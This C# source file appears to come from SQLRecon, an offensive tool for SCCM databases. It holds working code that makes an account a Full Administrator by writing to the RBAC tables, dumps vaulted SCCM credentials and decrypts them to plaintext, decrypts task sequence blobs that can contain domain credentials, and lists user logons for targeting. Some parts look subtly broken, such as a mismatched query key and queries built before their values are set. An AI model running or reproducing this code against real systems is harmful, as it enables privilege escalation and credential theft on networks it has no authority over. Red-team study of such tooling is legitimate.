using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Data.SqlClient;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Runtime.InteropServices;
using SQLRecon.Commands;
using SQLRecon.Utilities;

namespace SQLRecon.Modules
{
    internal abstract class Sccm
    {
        /// <summary>
        /// The AddSCCMAdmin method will elevate the specified account to a 'Full Administrator'
        /// within SCCM. If target user is already an SCCM user, this module will instead add necessary
        /// privileges to elevate. This module require sysadmin or similar privileges as writing to 
        /// SCCM database tables is required.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="username"></param>
        /// <param name="sid"></param>
        /// <param name="impersonate"></param>
        internal static void AddSccmAdmin(SqlConnection con, string username, string sid, string impersonate = null)
        {
            // Get site code for target site, use this for source site.
            string siteCode = "";
            string currentUserId = "";
            
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "site_code", Query.SccmSiteCode },
                { "check_rbac_admins" , Query.CheckSccmAdmins },
                { "get_privs" , string.Format(Query.GetSccmAdminPrivileges , currentUserId) },
                { "add_admin" , string.Format(Query.AddSccmAdmin, username, username.Split('\\')[1], siteCode) },
                { "check_id", Query.CheckSccmAdminId },
                { "permissions" , Query.AddSccmAdminPrivileges }
            };
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            if (!string.IsNullOrEmpty(impersonate))
            {
                queries = Format.ImpersonationDictionary(impersonate, queries);
            }

            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;
            
            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }
            
            byte[] sidBytes;

            sid = sid.ToUpper();

            // Use the current user.
            if (username.ToUpper().Equals("CURRENT"))
            {
                WindowsIdentity identity = WindowsIdentity.GetCurrent();
                sidBytes = new byte[identity.User.BinaryLength];
                identity.User.GetBinaryForm(sidBytes, 0);
                username = identity.Name;
            }
            // Use username and SID passed in as args.
            else if (username.Contains("\\"))
            {
                string[] argsSplit = { username, sid };

                sid = argsSplit.FirstOrDefault(x => x.StartsWith("S-1-5", StringComparison.OrdinalIgnoreCase));

                // Verify that the SID contains a value that is expected
                if (sid == null)
                {
                    Print.Error("Invalid SID detected. " +
                        "Ensure it follows the standard 'S-1-5-...' format, or is set to 'current'.", true);
                    // Go no further.
                    return;
                }

                SecurityIdentifier targetUser = new (sid);
                sidBytes = new byte[targetUser.BinaryLength];
                targetUser.GetBinaryForm(sidBytes, 0);
                username = argsSplit.FirstOrDefault(x => x.ToUpper().IndexOf("S-1-5", StringComparison.Ordinal) == -1);

                // Check to see if the username contains a backslash (domain convention).
                if (!username.Contains("\\") || string.IsNullOrEmpty(username))
                {
                    Print.Error("Invalid domain username format", true);
                    // Go no further.
                    return;
                }
            }
            else
            {
                Print.Error("Invalid domain username format. Ensure a valid username has been provided. " +
                    "Either 'DOMAIN\\USERNAME' or 'current'.", true);
                // Go no further.
                return;
            }
            
            using (SqlCommand command = new (queries["side_code"], con))
            {
                using (SqlDataReader dataReader = command.ExecuteReader())
                {
                    if (dataReader.HasRows)
                    {
                        dataReader.Read();
                    }
                }
            }

            StringBuilder sb = new ("0x");
            
            foreach (byte b in sidBytes)
            {
                sb.Append(b.ToString("X2"));
            }

            int resCount = 0;
            string currentUserLogonName = username;
            bool sms00001 = false;
            bool sms00004 = false;
            bool sms00All = false;

            /* 
             * Before adding user, check to see if they already exist in RBAC_Admins.
             * If they exist, get current permissions for the account and display, so
             * they can be maintained after removing additional admin privs.
             */

            using (SqlCommand command = new (queries["check_rbac_admins"], con))
            {
                command.Parameters.Add(new SqlParameter("@data", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes });
                
                using (SqlDataReader dataReader = command.ExecuteReader())
                {
                    // Check if target user already exists in SCCM.
                    if (dataReader.HasRows)
                    {
                        while (dataReader.Read())
                        {
                            resCount++;
                            
                            try
                            {
                                currentUserId = dataReader.GetFieldValue<int>(0).ToString();
                                currentUserLogonName = dataReader.GetFieldValue<string>(2);
                                Print.Status(
                                    $"Target user already exists in SCCM user table (logon name:{currentUserLogonName}). " +
                                    "Adding permissions to existing account.", true);
                            }
                            catch (Exception e)
                            {
                                Print.Error($"Unable to retrieve user data: {e}.", true);
                                // Go no further.
                                return;
                            }
                        }
                        
                        if (resCount > 1) 
                        {
                            Print.Error(
                                $"{resCount} matching entries for target SID identified, " +
                                "choose different user or delete one of these entries.", true);
                            // Go no further.
                            return;
                        }                        
                    }
                }
            }

            if (resCount == 1)
            {
                // Here we know we are dealing with a current user that has
                // exactly 1 entry in the admin list, assess their current privs.
                string targetUserCurrentPrivs = Sql.CustomQuery(con, queries["get_privs"]);
                
                // If target user has no privs assigned.
                if (targetUserCurrentPrivs == "")
                {
                    Print.Status("Target user does not appear to have any privileges assigned.", true);
                }
                // Else build out command so that current privileges can be restored to prior state at a later time.
                else
                {
                    IEnumerable<string> accountPrivileges = targetUserCurrentPrivs.Split('\n').Skip(2);
                    
                    foreach (string privilege in accountPrivileges)
                    {
                        string scopeId = privilege.Split('|')[0].Trim();
                        string roleId = privilege.Split('|')[1].Trim();
                        
                        // Check for existing privileges that intersect with the three we need to add.
                        if (scopeId == "SMS00ALL" && roleId == "SMS0001R")
                        {
                            sms00All = true;
                        }
                        if (scopeId == "SMS00004" && roleId == "SMS0001R")
                        {
                            sms00004 = true;
                        }
                        if (scopeId == "SMS00001" && roleId == "SMS0001R")
                        {
                            sms00001 = true;
                        }
                    }

                    // Check if target user is already a full admin. If so, exit as we don't need to do anything further.
                    if (sms00All && sms00004 && sms00001)
                    {
                        Print.Error("Target user appears to already be a 'Full Administrator' in SCCM.", true);
                        // Go no further.
                        return;
                    }

                    Print.Status("Target user already has some privileges assigned.", true);
                }

                StringBuilder compiledPrivs = new ();
                if (!sms00All)
                {
                    compiledPrivs.Append("SMS00ALL|SMS0001R,");
                }
                if(!sms00004)
                {
                    compiledPrivs.Append("SMS00004|SMS0001R,");
                }
                if(!sms00001)
                {
                    compiledPrivs.Append("SMS00001|SMS0001R,");
                }
                if (compiledPrivs.Length > 0)
                {
                    compiledPrivs.Length--;
                }
                Print.Status(
                    $"Use the this command to restore the account to its prior state: \"/database:{Var.Database} /module:sRemoveAdmin /user:{currentUserId} /remove:{compiledPrivs}\"", true);

            }
            // Else target user does not currently exist in SCCM.
            else if (resCount== 0)
            {
                using (SqlCommand sqlCommand = new(queries["add_admin"], con))
                {
                    sqlCommand.Parameters.Add(new SqlParameter("@adminSID", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes });
                    try
                    {
                        sqlCommand.ExecuteNonQuery();
                    }
                    catch (Exception e)
                    {
                        Print.Error($"Unable to add user to the 'RBAC_Admins' table: {e}.", true);
                        // Go no further.
                        return;
                    }
                }              

                // Now that user has been added, query once more to get their adminID for adding privileges.
                using (SqlCommand command = new (queries["check_id"], con))
                {
                    command.Parameters.Add(new SqlParameter("@data", System.Data.SqlDbType.VarBinary) { Size = sidBytes.Length, Value = sidBytes });
                    using (SqlDataReader dataReader = command.ExecuteReader())
                    {
                        // If target user already exists in SCCM 
                        if (dataReader.HasRows)
                        {
                            dataReader.Read();
                            currentUserId = dataReader.GetFieldValue<int>(0).ToString();
                        }
                        else
                        {
                            Print.Error("User does not appear to have been successfully added to the 'RBAC_Admins' table.", true);
                            // Go no further.
                            return;
                        }
                    }
                }

                Print.Success("Added target user to RBAC_Admins table.", true);
                Print.Status(
                    $"Use the this command to remove the account: \"/database:{Var.Database} /module:sRemoveAdmin /user:{currentUserId} /remove:00000000|00000000\"", true);
            }

            // At this point the targetuser is in the RBAC_Admins table either
            // via us adding them or via them previously existing, so add privs to make them a full admin
            
            if (!sms00All)
            {
                queries["permissions"] += $"({currentUserId}, 'SMS0001R', 'SMS00ALL', '29'),";
            }
            if (!sms00004)
            {
                queries["permissions"] += $"({currentUserId}, 'SMS0001R', 'SMS00004', '1'),";
            }
            if (!sms00001)
            {
                queries["permissions"] += $"({currentUserId}, 'SMS0001R', 'SMS00001', '1'),";
            }
            // Remove trailing comma
            queries["permissions"] = queries["permissions"].Remove(queries["permissions"].Length - 1,1);

            // Add privileges
            string permissionRes = Sql.CustomQuery(con, queries["permissions"]);

            if (permissionRes != "")
            {
                Print.Error($"Unable to add permissions on target user account: {permissionRes}.", true);
                // Go no further.
                return;
            }

            Print.Success(
                $"Assigned permissions to '{currentUserLogonName}'. The user should now be a 'Full Administrator' in SCCM.", true);
        }        

        /// <summary>
        /// The Credentials method lists credentials vaulted by SCCM for
        /// use in various functions. These credentials can not be remotely decrypted
        /// as the key is stored on the SCCM server. However, this module provides
        /// intel on if it makes sense to attempt to obtain the key.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="impersonate"></param>
        internal static void Credentials(SqlConnection con, string impersonate = null)
        { 
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;

            Console.WriteLine();
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            Print.IsOutputEmpty(
                !string.IsNullOrEmpty(impersonate)
                    ? Sql.CustomQuery(con, Format.ImpersonationQuery(impersonate, Query.GetSccmVaultedCredentials))
                    : Sql.CustomQuery(con, Query.GetSccmVaultedCredentials), true);
        }
        
        /// <summary>
        /// The DecryptVaultedCredentials method recovers encrypted credential string
        /// for accounts vaulted in SCCM and attempts to use the Microsoft Systems Management Server CSP 
        /// to attempt to decrypt them to plaintext.
        /// Uses the logic from @XPN's initial PoC SCCM secret decryption gist:
        /// Reference: https://t.ly/Dlinv
        /// This function must be run from an SCCM management server in a context
        /// that has the ability to access this CSP (high-integrity admin or SYSTEM).
        /// </summary>
        /// <param name="con"></param>
        internal static void DecryptCredentials(SqlConnection con)
        {
            if (_checkDatabase(con) == false)
                // Go no further
                return;

            string sqlQuery = Sql.CustomQuery(con, Query.GetSccmVaultedCredentialPasswords);

            List<string> userList = Print.ExtractColumnValues(sqlQuery,"UserName");
            List<string> useList = Print.ExtractColumnValues(sqlQuery,"Usage");
            List<string> passwordList = Print.ExtractColumnValues(sqlQuery,"Password");

            if (userList.Count > 0)
            {
                for (int i = 0; i < userList.Count; i++)
                {
                    string username = userList[i];
                    string use = useList[i];
                    string password = passwordList[i];

                    try
                    {
                        Print.Status("Identified vaulted SCCM credential:", true);
                        Print.Nested($"Username: {username}", true);

                        Print.Nested(
                            DecryptSccm.DecryptSccmCredential(password, out string plaintextPw)
                                ? $"Password: {plaintextPw}"
                                : $"Failed To Recover Password. Error: {plaintextPw}", true);

                        IEnumerable<string> uses = use.Split(new[] { "<UsageName>" }, StringSplitOptions.None).Skip(1);

                        foreach (string functionalRole in uses)
                        {
                            Print.Nested($"Function: {functionalRole.Substring(0, functionalRole.IndexOf("</UsageName>", StringComparison.Ordinal))}", true);
                        }

                        Console.WriteLine();

                    }
                    catch (Exception e)
                    {
                        Print.Error(username + " does not have a password configured, or the stored password is inaccessible.", true);
                        Print.Error(e.ToString(), true);
                    }
                }
            }
            else
            {
                // Go no further
                Print.Error("No results.", true);
            }
        }
        
        /// <summary>
        /// The Logons method queries the 'Computer_System_DATA' table to 
        /// retrieve all associated SCCM clients along with the user that last logged into them.
        /// NOTE: This only updates once a week by default and will not be 100% up to date.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="filter"></param>
        /// <param name="impersonate"></param>
        internal static void Logons(SqlConnection con, string filter, string impersonate = null)
        {
            // The queries dictionary contains all queries used by this module.
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "get_user", Query.GetSccmLogonUsers },
                { "filter", Query.SccmFilterLogonUsers }
            };
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            if (!string.IsNullOrEmpty(impersonate))
            {
                queries = Format.ImpersonationDictionary(impersonate, queries);
            }

                        
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;
            
            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }
            
            string filterType = null;
            string[] filterObjs = null;
            
            // Check for a filter and determine its type (if valid)
            if (!string.IsNullOrEmpty(filter))
            {
                bool validFilter = false;

                // Parse first filter arg (filter type)
                try
                {
                    filterType = filter.Split(' ')[0].ToLower().Substring(0, 4);
                    
                    if(filterType == "user" || filterType == "comp")
                    {
                        validFilter = true;
                    }
                }
                catch
                {
                    // ignored
                }

                if (validFilter == false)
                {
                    Print.Error("Invalid filter type (/filter:user, or /filter:computer)", true);
                    return;
                }               

                // Parse second filter arg (list of targets for filter)
                try
                {
                    filterObjs = filter.Split(' ')[1].Split(',');
                }
                catch
                {
                    Print.Error("Invalid filter object list. Provide a comma-seperated list of targets after the filter type.", true);
                    return;
                }
            }

            if (string.IsNullOrEmpty(filterType))
            {
                Print.IsOutputEmpty(Sql.CustomQuery(con, queries["get_user"]), true);
            }            
            else
            {
                StringBuilder sbQuery = new StringBuilder(queries["filter"]);

                bool isFirst = true;
                
                foreach (string targetObj in filterObjs)
                {
                    if (!isFirst)
                    {
                        sbQuery.Append(" or ");
                    }
                    else
                    {
                        isFirst = false;
                    }
                    if (filterType == "user")
                    {
                        // Check if user passed in user as domain\user
                        sbQuery.Append(targetObj.IndexOf('\\') > -1
                            ? $"Computer_System_Data.Username00 = '{targetObj}'"
                            : $"Computer_System_Data.Username00 like '%\\{targetObj}'");
                    }
                    // Else filter type == comp
                    else
                    {
                        sbQuery.Append($"Computer_System_Data.Name00 = '{targetObj}'");

                    }
                }
                sbQuery.Append(")");
                Print.IsOutputEmpty(Sql.CustomQuery(con, sbQuery.ToString()), true);
            }
            
        }
        
        /// <summary>
        /// The RemoveSCCMAdmin method removes the privileges of a user by removing a newly 
        /// added user entirely from the SCCM database. If the user already existed in some capacity
        /// the RemoveSCCMAdmin method just removes the three roles that were added to the account
        /// via writes to the permission table. Use the arguments provided by output of the 
        /// AddSCCMAdmin command to run this command. This module require sysadmin or 
        /// similar privileges as writing to SCCM database tables is required.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="adminId"></param>
        /// <param name="removeString"></param>
        /// <param name="impersonate"></param>
        internal static void RemoveSccmAdmin(SqlConnection con, string adminId, string removeString, string impersonate = null)
        {
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            {
                { "delete_user", Query.DeleteSccmUser },
                { "delete_admin_user", Query.DeleteSccmAdmin }
            };
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            if (!string.IsNullOrEmpty(impersonate))
            {
                queries = Format.ImpersonationDictionary(impersonate, queries);
            }
            
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;
            
            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }
            
            bool removeAccount = removeString.IndexOf("00000000|00000000", StringComparison.Ordinal) > -1;

            // Build string to remove privileges.
            StringBuilder removePrivsStr = new (queries["delete_user"]);
            
            bool privsAdded = false;

            if (removeString.IndexOf("SMS00ALL|SMS0001R", StringComparison.Ordinal) > -1 || removeAccount)
            {
                removePrivsStr.Append(
                    $"(AdminID={adminId} and ScopeID = 'SMS00ALL' and RoleID = 'SMS0001R' and ScopeTypeID = '29')");
                privsAdded = true;
            }
            
            if (removeString.IndexOf("SMS00004|SMS0001R", StringComparison.Ordinal) > -1 || removeAccount)
            {
                if (privsAdded)
                {
                    removePrivsStr.Append(" or ");
                }
                removePrivsStr.Append(
                    $"(AdminID={adminId} and ScopeID = 'SMS00004' and RoleID = 'SMS0001R' and ScopeTypeID = '1')");
                privsAdded = true;

            }
            
            if (removeString.IndexOf("SMS00001|SMS0001R", StringComparison.Ordinal) > -1 || removeAccount)
            {
                if (privsAdded)
                {
                    removePrivsStr.Append(" or ");
                }
                removePrivsStr.Append(
                    $"(AdminID={adminId} and ScopeID = 'SMS00001' and RoleID = 'SMS0001R' and ScopeTypeID = '1')");
            }

            // Attempt to remove privileges.
            string removePrivsOutput = Sql.CustomQuery(con, removePrivsStr.ToString());

            if (removePrivsOutput != "")
            {
                Print.Error(
                    "Something went wrong when attempting to remove privileges " +
                    $"from '{removePrivsOutput}' in the 'RBAC_ExtendedPermissions' table.", true);
                // Go no further.
                return;
            }

            Print.Success($"Removed privileges from {adminId}.", true);

            // Check if we need to remove account from RBAC_Admins as well
            if (removeAccount)
            {
                string removeAccountOutput = Sql.CustomQuery(con, string.Format(queries["delete_admin_user"], adminId));

                if (removeAccountOutput != "")
                {
                    Print.Error(
                        $"Something went wrong when attempting to remove user from the 'RBAC_Admins' table. {removePrivsOutput}.", true);
                    // Go no further.
                    return;
                }
                Print.Success($"Removed user with AdminID of '{adminId}' from the 'RBAC_Admins' table.", true);
            }
            Print.Success("All cleanup actions completed.", true);
        }
        
        /// <summary>
        /// The Sites method lists all sites stored in the SCCM databases' 'DPInfo' table.
        /// This can provide additional attack avenues as different sites 
        /// can be configured in different (insecure) ways.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="impersonate"></param>
        internal static void Sites(SqlConnection con, string impersonate = null)
        {
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;

            Console.WriteLine();
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            Console.WriteLine(!string.IsNullOrEmpty(impersonate)
                ? Sql.CustomQuery(con, Format.ImpersonationQuery(impersonate, Query.GetSccmSites))
                : Sql.CustomQuery(con, Query.GetSccmSites));
        }
        
        /// <summary>
        /// The TaskData method recovers all task sequences stored in the SCCM
        /// database and decrypts them to plaintext. Task sequences can contain credentials
        /// for joining systems to domains, mapping shares, running commands, etc.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="impersonate"></param>
        internal static void TaskData(SqlConnection con, string impersonate = null)
        {
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            string query = !string.IsNullOrEmpty(impersonate) 
                ? Format.ImpersonationQuery(impersonate, Query.GetSccmTaskData) 
                : Query.GetSccmTaskData;
            
            // Use custom request formatter, so we can get bytes back.
            using SqlCommand command = new (query, con);
            using SqlDataReader dataReader = command.ExecuteReader();
            
            if (dataReader.HasRows)
            {
                while (dataReader.Read())
                {
                    byte[] hexEncodedBlob = dataReader.GetFieldValue<byte[]>(2);

                    Console.WriteLine();
                    Print.Status("Gathered encrypted task sequence blob.", true);
                    Print.Nested($"Task Sequence ID: {dataReader.GetFieldValue<string>(0)}", true);
                    Print.Nested($"Task Sequence Name: {dataReader.GetFieldValue<string>(1)}", true);
                    Print.Nested("Attempting to decrypt task data:", true);
                    Console.WriteLine();
                    string blobHexStr = Encoding.ASCII.GetString(hexEncodedBlob);
                    Print.Status(_decodeData(_hexStrToBytes(blobHexStr)), true);
                }
            }
            else
            {
                Print.Error("No SCCM tasks exist", true);
            }
        }
       
        /// <summary>
        /// The TaskList method provides a list of all task sequences stored
        /// in the SCCM database, but does not access the actual task data contents.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="impersonate"></param>
        internal static void TaskList(SqlConnection con, string impersonate = null)
        {
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;
            
            Console.WriteLine();
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            Console.WriteLine(!string.IsNullOrEmpty(impersonate)
                ? Sql.CustomQuery(con, Format.ImpersonationQuery(impersonate, Query.GetSccmTaskList))
                : Sql.CustomQuery(con, Query.GetSccmTaskList));
        }
        
        /// <summary>
        /// The Users method lists all users in the RBAC_Admins table. 
        /// These are all users configured for some level of access to SCCM.
        /// A check is performed to see if the current database is a SCCM database.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="impersonate"></param>
        internal static void Users(SqlConnection con, string impersonate = null)
        {
            // The queries dictionary contains all queries used by this module
            Dictionary<string, string> queries = new Dictionary<string, string>
            { 
                { "sccm_users", Query.GetSccmUsers },
                { "sccm_user_permissions", Query.GetSccmPrivileges },
            };
            
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            if (!string.IsNullOrEmpty(impersonate))
            {
                queries = Format.ImpersonationDictionary(impersonate, queries);
            }
            
            if (_checkDatabase(con, impersonate) == false)
                // Go no further
                return;

            // If /debug is provided, only print the queries then gracefully exit the program.
            if (Print.DebugQueries(queries))
            {
                // Go no further
                return;
            }
            
            Console.WriteLine();
            Print.Status("High-Level SCCM User Listing:", true);
            Console.WriteLine();
            Console.WriteLine(Sql.CustomQuery(con, queries["sccm_users"]));

            Console.WriteLine();
            Print.Status("Detailed Permissions:", true);
            Console.WriteLine();
            Console.WriteLine(Sql.CustomQuery(con, queries["sccm_user_permissions"]));
        }
        
        /// <summary>
        /// The _checkDatabase method checks to see if a valid SCCM database has been supplied
        /// through determining if the 'RBAC_Admins' table exists.
        /// Impersonation is supported.
        /// </summary>
        /// <param name="con"></param>
        /// <param name="impersonate"></param>
        /// <returns></returns>
        private static bool _checkDatabase(SqlConnection con, string impersonate = null)
        {
            // Check to see if the 'RBAC_Admins' table exists
            // If impersonation is set, then prepend all queries with the
            // "EXECUTE AS LOGIN = '" + impersonate + "'; " statement.
            string sqlOutput = (!string.IsNullOrEmpty(impersonate)
                ? Sql.CustomQuery(con, Format.ImpersonationQuery(impersonate, Query.CheckSccmDatabase))
                : Sql.CustomQuery(con, Query.CheckSccmDatabase));
            
            // The returned string should be a 1-entry table that includes the count of tables with a name of 'RBAC_Admins'
            // which should be '1' or '0' depending on if we have the correct db or not.
            if (sqlOutput.ToLower().Contains("rbac_admins") || Var.Debug)
            {
                // If Debug is true, then falsify that the table is present so that execution can continue in
                // the methods which call this method.
                return true;
            }
            else
            {
                Print.Error(
                    $"The database '{Var.Database}' does contain the 'RBAC_Admins' " +
                    "table. This indicates that the database is not an SCCM database, or your account " +
                    "does not have sufficient privileges to view all SCCM tables.", true);
                    
                // Go no further.
                return false;
            }
        }

        /// <summary>
        /// Reference: https://t.ly/lyD0B
        /// </summary>
        /// <param name="hexStr"></param>
        /// <returns></returns>
        private static byte[] _hexStrToBytes(string hexStr)
        {
            byte[] retVal = new byte[hexStr.Length / 2];

            for (int i = 0; i < hexStr.Length >> 1; ++i)
            {
                retVal[i] = (byte)((_getHexVal(hexStr[i << 1]) << 4) + (_getHexVal(hexStr[(i << 1) + 1])));
            }

            return retVal;
        }

        /// <summary>
        /// The _getHexVal method gets the hex value.
        /// </summary>
        /// <param name="hex"></param>
        /// <returns></returns>
        private static int _getHexVal(char hex)
        {
            int val = hex;
            return val - (val < 58 ? 48 : (val < 97 ? 55 : 87));
        }

        /// <summary>
        /// The _decodeData method decodes agent tasking.
        /// </summary>
        /// <param name="encryptedBlob"></param>
        /// <returns></returns>
        private static string _decodeData(byte[] encryptedBlob)
        {
            // At offset 52 in the blob is a dword that contains the length of the contained data.
            // This data always begins at offset 64 in the blob.
            UInt32 dataLen = BitConverter.ToUInt32(encryptedBlob, 52);
            byte[] encryptedData = new byte[dataLen];
            Array.Copy(encryptedBlob, 64, encryptedData, 0, dataLen);

            // Key data used to decode the blob consists of 40 bytes that begin at offset 4 within the blob.
            byte[] hashBase = new byte[40];
            Array.Copy(encryptedBlob, 4, hashBase, 0, 40);

            // This initial data is used to derive the key that is in turn used to decrypt the data in the blob.
            PasswordDeriveBytes pdb = new PasswordDeriveBytes(hashBase, null);
            byte[] pwIv = new byte[] { 0, 0, 0, 0, 0, 0, 0, 0 };
            byte[] key = pdb.CryptDeriveKey("TripleDES", "SHA1", 192, pwIv);

            using TripleDESCryptoServiceProvider tdes = new TripleDESCryptoServiceProvider();
            tdes.Key = key;
            tdes.Mode = CipherMode.CBC;
            tdes.Padding = PaddingMode.PKCS7;
            tdes.IV = new byte[] { 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00 };
            byte[] decrypted;
            try
            {
                ICryptoTransform ic = tdes.CreateDecryptor();
                decrypted = ic.TransformFinalBlock(encryptedData, 0, encryptedData.Length);
            }
            finally
            {
                tdes.Clear();
            }
            return (Encoding.Unicode.GetString(decrypted));
        }
    }

    /// <summary>
    /// The following class is adopted from @XPN's SCCM Decryption PoC Gist: 
    /// Reference: https://t.ly/Dlinv
    /// </summary>
    internal abstract class DecryptSccm
    {
        [DllImport("advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        static extern bool CryptAcquireContext(ref IntPtr hProv, string pszContainer, string pszProvider, uint dwProvType, uint dwFlags);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptDecrypt(IntPtr hKey, IntPtr hHash, int final, uint dwFlags, byte[] pbData, ref uint pdwDataLen);

        [DllImport(@"advapi32.dll", CharSet = CharSet.Auto, SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        private static extern bool CryptImportKey(IntPtr hProv, byte[] pbKeyData, UInt32 dwDataLen, IntPtr hPubKey, UInt32 dwFlags, ref IntPtr hKey);

        /// <summary>
        /// @XPN's initial PoC SCCM secret decryption gist:
        /// Reference: https://t.ly/Dlinv
        /// </summary>
        /// <param name="credentialBlob"></param>
        /// <param name="plaintextPw"></param>
        /// <returns></returns>
        internal static bool DecryptSccmCredential(string credentialBlob, out string plaintextPw)
        {
            IntPtr kHandle = IntPtr.Zero;
            IntPtr context = IntPtr.Zero;
            byte[] keyLengthBuffer = new byte[4];
            byte[] decryptedLengthBuffer = new byte[4];

            var inputData = _strToByteArr(credentialBlob);
            if (inputData == null)
            {
                plaintextPw = "[!] Input string not in correct format, skipping.";
                return false;
            }
            Array.Copy(inputData, 0, keyLengthBuffer, 0, 4);
            int keyLength = BitConverter.ToInt32(keyLengthBuffer, 0);

            Array.Copy(inputData, 4, decryptedLengthBuffer, 0, 4);

            var cryptLength = (uint)(inputData.Length - 8 - (keyLength));

            var key = new byte[keyLength];
            Array.Copy(inputData, 8, key, 0, keyLength);

            if (!CryptAcquireContext(ref context, "Microsoft Systems Management Server", "Microsoft Enhanced RSA and AES Cryptographic Provider", 0x18, 96U) && !CryptAcquireContext(ref context, "Microsoft Systems Management Server", null, 0x18, 104U))
            {
                uint lastWin32Error = (uint)Marshal.GetLastWin32Error();
                plaintextPw = $"CryptAcquireContext failed with HRESULT {lastWin32Error}";
                return false;
            }

            if (!CryptImportKey(context, key, (uint)keyLength, IntPtr.Zero, 0, ref kHandle))
            {
                uint lastWin32Error2 = (uint)Marshal.GetLastWin32Error();
                plaintextPw = $"CryptImportKey failed with HRESULT {lastWin32Error2}";
                return false;
            }

            var crypted = new byte[cryptLength];
            Array.Copy(inputData, 8 + keyLength, crypted, 0, inputData.Length - 8 - (keyLength));

            if (!CryptDecrypt(kHandle, IntPtr.Zero, 1, 0, crypted, ref cryptLength))
            {
                uint lastWin32Error3 = (uint)Marshal.GetLastWin32Error();
                plaintextPw = $"CryptDecrypt failed with HRESULT {lastWin32Error3}";
                return false;
            }

            plaintextPw = Encoding.ASCII.GetString(crypted, 0, (int)cryptLength);
            return true;
        }

        /// <summary>
        /// Needed for @XPN's initial PoC SCCM secret decryption gist:
        /// Reference: https://t.ly/Dlinv
        /// </summary>
        /// <param name="inputString"></param>
        /// <returns></returns>
        private static byte[] _strToByteArr(string inputString)
        {
            List<byte> inputDataList = new List<byte>();

            if (inputDataList.Count % 2 != 0)
            {
                return null;
            }

            for (int i = 0; i < inputString.Length; i += 2)
            {
                byte t = Convert.ToByte(inputString.Substring(i, 2), 16);
                inputDataList.Add(t);
            }

            return inputDataList.ToArray();
        }
    }
}
